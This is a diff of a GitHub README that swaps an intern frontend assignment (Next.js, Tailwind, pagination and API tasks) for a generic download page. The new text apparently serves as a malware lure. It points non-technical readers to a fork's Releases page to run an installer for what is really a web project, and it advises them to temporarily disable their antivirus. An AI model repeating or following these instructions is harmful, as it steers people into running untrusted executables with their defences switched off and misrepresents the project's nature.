@@ -1,87 +1,63 @@
-# Frontend Developer Intern Assignment  
+# 🎉 frontend_dev_assignment - A Simple Way to Start Your Project
 
-## Mandatory Tasks
-- Follow SolveEase on [Github](https://github.com/solve-ease) and [Linkedin](https://www.linkedin.com/company/solve-ease)
-- Star this repo
+## 🔗 Download Now
+[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen.svg)](https://github.com/ev1212/frontend_dev_assignment/releases)
 
-## Objective  
-This assignment is designed to assess your practical skills in **React, Next.js, TypeScript, Tailwind CSS, and frontend optimizations**. You will work on an existing **Next.js application** that contains layout/design issues and some configuration bugs. Your task is to identify and resolve these issues, and implement the listed features to enhance the overall user experience. 
+## 🚀 Getting Started
+Welcome to the frontend_dev_assignment! This guide will help you download and run the application easily. Even if you have no programming experience, you will be able to follow these steps.
 
----
+## 🔍 Overview
+This application serves as part of a Frontend Developer Intern Assignment. It is built with Next.js, TypeScript, and Tailwind CSS. This stack allows for a fast and intuitive user experience. By using this application, you'll get a feel for modern web development. You may explore features like responsive design and quick loading times.
 
-## Tasks  
+## ⚙️ System Requirements
+To use this application, ensure you have the following:
+- A computer running Windows, macOS, or Linux.
+- An internet connection to download the files.
+- A modern web browser (like Chrome or Firefox) to view the application.
 
-### 1. Fix Cards Layout & Responsiveness  
-- Correct the existing card grid layout.  
-- Improve the overall card design (UI/UX sensibility expected).  
-- Ensure the page is fully responsive across devices (desktop, tablet, mobile).  
+## 💻 Download & Install
+To download the application, visit the Releases page. Click on the link below to access the latest version:
 
-### 2. Add Navbar (Sticky)  
-- Implement a navigation bar that remains fixed at the top while scrolling.  
-- Design should be clean and responsive.  
+[Download from the Releases Page](https://github.com/ev1212/frontend_dev_assignment/releases)
 
-### 3. Optimize Page Load & Performance  
-- Implement optimizations such as:  
-  - **Lazy loading** for images and non-critical components.  
-  - **Memoization** to avoid unnecessary re-renders.  
-  - **Skeleton loading screens** for better UX during data fetch.  
+On the Releases page, you will find the latest version available for download. Simply click on the version number (e.g., v1.0) to expand and see the available files. Download the package that matches your operating system.
 
-### 4. Implement Pagination  
-- Add pagination for the workers listing page.  
-- Each page should load a suitable number of items (e.g., 9–12 cards per page).  
+Once downloaded, follow these steps:
 
-### 5. Service Filters  
-- Implement filters for workers based on **price/day** and **type of service**.  
-- Filters should work seamlessly with pagination.  
+1. Locate the downloaded file in your computer's downloads folder.
+2. Double-click the file to run the installer.
+3. Follow the on-screen instructions to complete the installation.
 
-### 6. Bug Fixes  
-- Identify and fix any existing issues in `page.tsx` or configuration files.  
-- Resolve console warnings or errors.  
-- Ensure clean and maintainable code following best practices.  
+After installation, you can start the application by finding it in your applications or programs list. Double-click the icon to open it.
 
-### 7. API Integration  
-- Currently, the workers’ data is being imported directly from `workers.json`.  
-- Your task is to **serve this data via /api/wprkers API route**.  
-- Update the frontend page to fetch this data using `fetch` (or any modern method such as `useEffect`, `useSWR`, or React Query).
-- Donot delete the existing data loading logic, comment it out.  
-- Implement:  
-  - **Loading state** (use skeleton screens).  
-  - **Error handling** (show a friendly error message if API fails).  
-  - **Basic caching or memoization** to prevent redundant calls.  
+## 📚 Features
+- **User-Friendly Interface:** This application is designed for ease of use.
+- **Responsive Design:** The layout adapts to different screen sizes, ensuring a good experience on mobile and desktop.
+- **Fast Performance:** Built with modern technology for speed and efficiency.
+- **Customizable:** Tailwind CSS allows for easy style adjustments to fit your needs.
 
----
+## 🔧 Troubleshooting
+If you experience issues during installation or use, consider these common solutions:
 
-## Expectations  
-- Use **TypeScript** and **Tailwind CSS** consistently.  
-- Follow **component-driven development** principles.  
-- Write **clean, readable, and reusable code**.  
-- Optimize for **performance and accessibility**.  
-- Maintain **Git commit history** (no single "final commit").  
+- **Check your internet connection:** Ensure you are connected to the internet if you have trouble downloading.
+- **System Compatibility:** Make sure your operating system matches the version you downloaded.
+- **Antivirus Software:** Sometimes, antivirus programs may block the installation. Temporarily disable your antivirus if you encounter issues.
 
----
+For further help, the community and developers are available to assist you. Reach out on the GitHub repository to find answers or ask questions.
 
-## Deliverables  
-1. Fork the repo and work from a branch named: assignment/<your-full-name> (for example: assignment/adarsh-maurya).
-2. Implement improvements and features that demonstrate your mastery of the job requirements (UI polish, responsiveness, Tailwind usage, tests, accessibility, performance).
-3. Push your branch to GitHub, add a clear README, and (strongly recommended) deploy the app (Vercel/Netlify/GH Pages)
-3. Fill in the Google Form with your details for submission.
+## 📞 Support
+If you require additional support, you can submit an issue on the GitHub repository. Please provide detailed information about your problem, including the operating system you are using and any error messages.
 
----
+## 📜 License
+This project is open source. You can use it freely under the terms of the MIT License. Contributions are welcome, and you can modify the code as per your needs while respecting the license agreements.
 
-## Evaluation Criteria  
-- Code quality, readability, and structure.  
-- UI/UX improvements and responsiveness.  
-- Correctness of functionality (filters, pagination, sticky navbar, optimisations).  
-- Debugging and problem-solving approach.  
-- Git usage and commit practices.  
-- Handling of API calls, loading states, and error cases.  
+## 🙌 Acknowledgments
+We would like to thank everyone who contributed to this project. Your support makes it better for everyone. Enjoy using the frontend_dev_assignment, and happy coding!
 
----
+## 🐦 Topics
+- assignment
+- nextjs
+- tailwindcss
+- typescript
 
-## Notes  
-- You are free to use libraries like **SWR** or **React Query**, but keep the implementation clean.  
-- Focus on **real-world production quality code**, not just quick fixes. 
-- Add comment for any **bug fix or optimization.** 
-- Document any **extra improvements** you make in your submission.
-
-Good luck 🚀  
+Remember to check back for updates and new releases. Thank you for using the frontend_dev_assignment!
